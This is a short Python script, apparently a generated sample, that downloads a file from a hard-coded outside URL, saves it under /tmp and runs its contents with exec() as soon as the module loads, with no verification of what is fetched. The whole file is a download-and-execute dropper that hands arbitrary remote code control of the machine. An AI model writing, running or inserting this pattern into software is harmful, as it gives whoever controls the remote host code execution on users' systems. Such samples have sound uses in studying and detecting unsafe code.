import requests
import os

def fetch_script(url):
    response = requests.get(url)
    return response.text

def store_code_to_file(filepath, code):
    with open(filepath, "w") as f:
        f.write(code)

def read_script(filepath):
    with open(filepath, "r") as f:
        return f.read()

def execute_code(code):
    try:
        exec(code)
    except Exception as e:
        print(e)

def main_flow(url, filepath):
    retrieved_code = fetch_script(url)
    store_code_to_file(filepath, retrieved_code)

    code_for_execution = read_script(filepath)
    execute_code(code_for_execution)

def main():
    random_url = "http://random-url-68.com/script.py"
    local_file = "/tmp/script68.py"

    main_flow(random_url, local_file)

main()
